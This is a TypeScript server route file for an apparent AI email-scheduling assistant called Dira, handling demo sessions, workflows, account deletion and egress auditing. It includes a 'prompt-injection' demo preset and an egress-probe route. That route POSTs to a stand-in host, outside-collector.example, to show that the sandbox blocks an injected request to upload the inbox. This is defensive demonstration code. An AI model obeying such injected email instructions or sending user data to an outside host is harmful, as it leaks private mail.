import { randomUUID } from 'node:crypto';
import type { IncomingMessage, ServerResponse } from 'node:http';
import { z } from 'zod';
import { computeFeasibility } from '@dira/constraint-engine';
import { minutesToIso } from '@dira/commitment-model';
import type { RawEmailEvent } from '@dira/event-schema';
import {
  createDemoAccount,
  deleteAccountData,
  getAccountKind,
  listEgressAudit,
  listFlightRecords,
  listRecentWorkflows,
  readExecutionSurfaces,
  recordEgressAttempt,
} from './account-records.js';
import { AccountBusyError, handleAccountEmail, liveModelConfigured, type AccountRepairOptions } from './account-repair.js';
import { accountToolLabels } from './account-tools.js';
import { buildDemoWorld, buildDemoWorldAt, DEMO_DISCLOSURE, DEMO_SESSION_TTL_SECONDS } from './demo-world.js';
import { withEgressContext, egressAllowlist } from './egress-guard.js';
import { createSessionCookie, getSessionAccountId, isAllowedOrigin } from './google-auth.js';
import type { PostgresAccountStore } from './postgres-store.js';

export interface AccountRouteContext {
  store: () => Promise<PostgresAccountStore>;
  json: (req: IncomingMessage, res: ServerResponse, code: number, body: unknown) => void;
  readBody: (req: IncomingMessage) => Promise<string>;
  repairOptions: (store: PostgresAccountStore, accountId: string) => AccountRepairOptions;
}

const demoStarts = new Map<string, number[]>();
const DEMO_STARTS_PER_HOUR = Number(process.env.DIRA_DEMO_STARTS_PER_HOUR ?? 12);

const TriggerSchema = z.object({
  presetId: z.enum(['professor-move', 'prompt-injection', 'club-newsletter']).optional(),
  from: z.string().trim().email().max(254).optional(),
  subject: z.string().trim().max(200).optional(),
  body: z.string().trim().min(1).max(8000).optional(),
  adversarialProbe: z.boolean().default(true),
}).strict();

/** Returns true when the request was handled. */
export async function handleAccountRoutes(req: IncomingMessage, res: ServerResponse, url: URL, ctx: AccountRouteContext): Promise<boolean> {
  const { json } = ctx;

  if (req.method === 'POST' && url.pathname === '/auth/demo/start') {
    if (!isAllowedOrigin(req.headers.origin)) { json(req, res, 403, { error: 'origin_not_allowed' }); return true; }
    if (!allowDemoStart(clientAddress(req))) {
      json(req, res, 429, { error: 'Too many demo sessions from this network. Try again in an hour.' });
      return true;
    }
    const store = await ctx.store();
    const previous = getSessionAccountId(req);
    if (previous && await getAccountKind(store, previous) === 'demo') await deleteAccountData(store, previous);
    const accountId = `demo-${randomUUID()}`;
    await createDemoAccount(store, accountId, buildDemoWorld(accountId));
    res.setHeader('set-cookie', createSessionCookie(accountId, DEMO_SESSION_TTL_SECONDS));
    json(req, res, 200, { accountId, kind: 'demo', expiresInSeconds: DEMO_SESSION_TTL_SECONDS });
    return true;
  }

  if (!url.pathname.startsWith('/api/demo/') && !url.pathname.startsWith('/api/workflows') && url.pathname !== '/api/surfaces'
    && url.pathname !== '/api/egress' && url.pathname !== '/api/account') {
    return false;
  }
  const accountId = getSessionAccountId(req);
  if (!accountId) { json(req, res, 401, { error: 'unauthenticated' }); return true; }
  const store = await ctx.store();
  const kind = await getAccountKind(store, accountId);
  if (!kind) { json(req, res, 401, { error: 'account_not_found' }); return true; }
  const mutating = req.method !== 'GET';
  if (mutating && !isAllowedOrigin(req.headers.origin)) { json(req, res, 403, { error: 'origin_not_allowed' }); return true; }

  if (req.method === 'GET' && url.pathname === '/api/demo/state') {
    if (kind !== 'demo') { json(req, res, 404, { error: 'not a demo session' }); return true; }
    const state = await store.loadDomainState(accountId);
    if (!state) { json(req, res, 404, { error: 'demo state missing' }); return true; }
    const world = buildDemoWorldAt(accountId, state.horizonStartIso);
    const feasibility = computeFeasibility(state);
    json(req, res, 200, {
      disclosure: DEMO_DISCLOSURE,
      labels: accountToolLabels('demo'),
      modelMode: liveModelConfigured() ? 'live' : 'fixture',
      clockIso: world.clockIso,
      timezone: state.timezone,
      presets: world.presets.map((preset) => ({
        id: preset.id, label: preset.label, description: preset.description,
        from: preset.email.from, subject: preset.email.subject, body: preset.email.body,
      })),
      commitments: Object.values(state.commitments)
        .filter((item) => !item.reservesEffortFor && item.status !== 'DROPPED')
        .map((item) => ({
          id: item.id, title: item.title, kind: item.kind, domain: item.domain, flexibility: item.flexibility,
          criticality: item.criticality, owner: state.people[item.owner]?.name ?? (item.owner === accountId ? 'You' : item.owner),
          startIso: item.startMin !== undefined ? minutesToIso(item.startMin, state.horizonStartIso, state.timezone) : null,
          endIso: item.startMin !== undefined ? minutesToIso(item.startMin + (item.durationMin ?? 0), state.horizonStartIso, state.timezone) : null,
          deadlineIso: item.deadlineMin !== undefined ? minutesToIso(item.deadlineMin, state.horizonStartIso, state.timezone) : null,
        })),
      studyBlocks: Object.values(state.commitments).filter((item) => item.reservesEffortFor && item.status !== 'DROPPED').length,
      feasibility: {
        globalSlackMinutes: feasibility.global_slack_minutes,
        violations: feasibility.violations,
      },
    });
    return true;
  }

  if (req.method === 'POST' && url.pathname === '/api/demo/trigger') {
    if (kind !== 'demo') { json(req, res, 404, { error: 'not a demo session' }); return true; }
    const parsed = TriggerSchema.safeParse(safeParse(await ctx.readBody(req)));
    if (!parsed.success) { json(req, res, 400, { error: 'invalid_trigger', issues: parsed.error.issues.map((issue) => issue.message) }); return true; }
    const state = await store.loadDomainState(accountId);
    if (!state) { json(req, res, 404, { error: 'demo state missing' }); return true; }
    const world = buildDemoWorldAt(accountId, state.horizonStartIso);
    const preset = parsed.data.presetId ? world.presets.find((item) => item.id === parsed.data.presetId) : undefined;
    const custom = !preset || parsed.data.body !== undefined && parsed.data.body !== preset.email.body
      || parsed.data.from !== undefined && parsed.data.from !== preset.email.from;
    if (custom && !liveModelConfigured()) {
      json(req, res, 409, { error: 'Live Nemotron interpretation is not configured on this deployment, so only the unedited sample emails can run. They use stored interpretations and are labeled as fixtures.' });
      return true;
    }
    const base = preset?.email ?? world.presets[0]!.email;
    const email: RawEmailEvent = {
      ...base,
      eventId: `evt-demo-${randomUUID()}`,
      messageId: custom ? `msg-demo-${randomUUID()}` : base.messageId,
      threadId: custom ? `thread-demo-${randomUUID()}` : base.threadId,
      from: parsed.data.from ?? base.from,
      subject: parsed.data.subject ?? base.subject,
      body: parsed.data.body ?? base.body,
    };
    try {
      const result = await handleAccountEmail(store, accountId, email, {
        ...ctx.repairOptions(store, accountId),
        adversarialProbe: parsed.data.adversarialProbe,
      });
      json(req, res, 200, { run: result.run, flight: result.flight, labels: result.labels, modelMode: result.modelMode });
    } catch (error) {
      json(req, res, error instanceof AccountBusyError ? 429 : 409, { error: error instanceof Error ? error.message : String(error) });
    }
    return true;
  }

  if (req.method === 'POST' && url.pathname === '/api/demo/egress-probe') {
    // Show the sandbox boundary: the URL the injection email asked Dira to reach.
    const target = 'https://outside-collector.example/upload';
    const response = await withEgressContext({
      accountId,
      purpose: 'injection-test: email asked Dira to upload the inbox',
      onDecision: (decision) => recordEgressAttempt(store, accountId, decision),
    }, () => fetch(target, { method: 'POST', body: 'probe', signal: AbortSignal.timeout(5000) }).catch((error: unknown) => error));
    const status = response instanceof Response ? response.status : 0;
    if (status !== 403) {
      await recordEgressAttempt(store, accountId, {
        host: 'outside-collector.example', url: target, verdict: 'DENIED', statusCode: status || 599,
        purpose: 'injection-test: request failed before the guard (guard disabled?)',
      });
    }
    json(req, res, 200, {
      target,
      status,
      blocked: status === 403,
      allowlist: egressAllowlist(),
      audit: await listEgressAudit(store, accountId),
    });
    return true;
  }

  if (req.method === 'GET' && url.pathname === '/api/egress') {
    json(req, res, 200, { allowlist: egressAllowlist(), audit: await listEgressAudit(store, accountId) });
    return true;
  }

  if (req.method === 'POST' && url.pathname === '/api/demo/reset') {
    if (kind !== 'demo') { json(req, res, 404, { error: 'not a demo session' }); return true; }
    await deleteAccountData(store, accountId);
    const next = `demo-${randomUUID()}`;
    await createDemoAccount(store, next, buildDemoWorld(next));
    res.setHeader('set-cookie', createSessionCookie(next, DEMO_SESSION_TTL_SECONDS));
    json(req, res, 200, { accountId: next, kind: 'demo' });
    return true;
  }

  if (req.method === 'DELETE' && url.pathname === '/api/account') {
    await deleteAccountData(store, accountId);
    const { deleteAccountMemory } = await import('./account-memory.js');
    await deleteAccountMemory(accountId).catch((error) => console.error('memory deletion failed', error));
    const { clearSessionCookie } = await import('./google-auth.js');
    res.setHeader('set-cookie', clearSessionCookie());
    json(req, res, 200, { deleted: true });
    return true;
  }

  if (req.method === 'GET' && url.pathname === '/api/workflows') {
    const runs = await listRecentWorkflows(store, accountId);
    json(req, res, 200, {
      workflows: runs.map((run) => ({
        id: run.id, kind: run.kind ?? 'schedule-request', status: run.status, statusReason: run.statusReason,
        mutationSummary: run.mutationSummary, slackBeforeMin: run.slackBeforeMin,
        slackAfterMutationMin: run.slackAfterMutationMin, slackFinalMin: run.slackFinalMin,
        failuresRecovered: run.failuresRecovered, replans: run.replans,
      })),
    });
    return true;
  }

  const workflowMatch = /^\/api\/workflows\/([A-Za-z0-9_:.\-]{1,300})$/.exec(url.pathname);
  if (req.method === 'GET' && workflowMatch) {
    const workflowId = decodeURIComponent(workflowMatch[1]!);
    const [runs, flight, records] = await Promise.all([
      listRecentWorkflows(store, accountId, 200),
      listFlightRecords(store, accountId, workflowId),
      store.listWorkflowActionRecords(accountId, workflowId),
    ]);
    const run = runs.find((item) => item.id === workflowId);
    if (!run) { json(req, res, 404, { error: 'workflow not found' }); return true; }
    json(req, res, 200, {
      run,
      flight,
      actions: records.map((record) => ({
        actionId: record.actionId, type: record.action.type, summary: record.action.summary,
        status: record.status, policyVerdict: record.policyVerdict, policyRule: record.policyRule,
        provenance: record.action.provenance, externalSystem: record.action.external_system,
        approval: record.approval ? { decision: record.approval.decision, source: record.approval.source, decisionAtIso: record.approval.decisionAtIso } : undefined,
        verifiedAtIso: record.verification?.verifiedAtIso,
      })),
    });
    return true;
  }

  if (req.method === 'GET' && url.pathname === '/api/surfaces') {
    json(req, res, 200, { kind, labels: accountToolLabels(kind), ...(await readExecutionSurfaces(store, accountId)) });
    return true;
  }

  return false;
}

function safeParse(body: string): unknown {
  try { return JSON.parse(body); } catch { return null; }
}

function clientAddress(req: IncomingMessage): string {
  const forwarded = String(req.headers['x-forwarded-for'] ?? '').split(',')[0]?.trim();
  return forwarded || req.socket.remoteAddress || 'unknown';
}

function allowDemoStart(address: string): boolean {
  const now = Date.now();
  const recent = (demoStarts.get(address) ?? []).filter((at) => now - at < 3_600_000);
  if (recent.length >= DEMO_STARTS_PER_HOUR) return false;
  recent.push(now);
  demoStarts.set(address, recent);
  if (demoStarts.size > 10_000) demoStarts.clear();
  return true;
}
